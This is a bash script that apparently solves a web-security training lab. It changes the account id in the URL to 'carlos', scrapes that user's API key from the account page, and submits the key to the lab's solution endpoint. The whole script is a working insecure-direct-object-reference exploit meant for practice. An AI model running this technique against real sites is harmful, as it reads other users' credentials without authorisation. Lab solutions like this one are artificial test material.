#!/bin/bash

get_api_key() {

    echo "(+) Getting Carlos's API Key..."
    carlos_account="${url}/my-account?id=carlos"
    key=$(curl -s "${carlos_account}" | grep 'API' | cut -d ':' -f 2 | cut -d '<' -f 1 | xargs)
    if [ -n "$key" ]; then
        echo "(+) Found the API Key: $key"

    else
        echo "(-) Could not find the key"
        echo "(-) Exiting..."
        exit 1
    fi

    submit_key "$url" "$key"

}

submit_key() {

    echo "(+) Submitting the key"
    response=$(curl -s -d "answer=${key}" "${url}/submitSolution")
    true=$(echo "$response" | grep "true")
    if [ -n "$true" ]; then
        echo "(+) Successfully completed the Lab!"
    else
        echo "(+) Something went wrong!"
        echo "(+) Exiting..."
        exit 1
    fi

}

main() {

    if [ $# -ne 1 ]; then
        echo "(+) Usage: $0 website"
        echo "(+) Example: $0 www.example.com"
        exit 1
    fi

    echo "(+) Starting the script..."
    url=$1
    get_api_key "$url"
    

}

main "$@"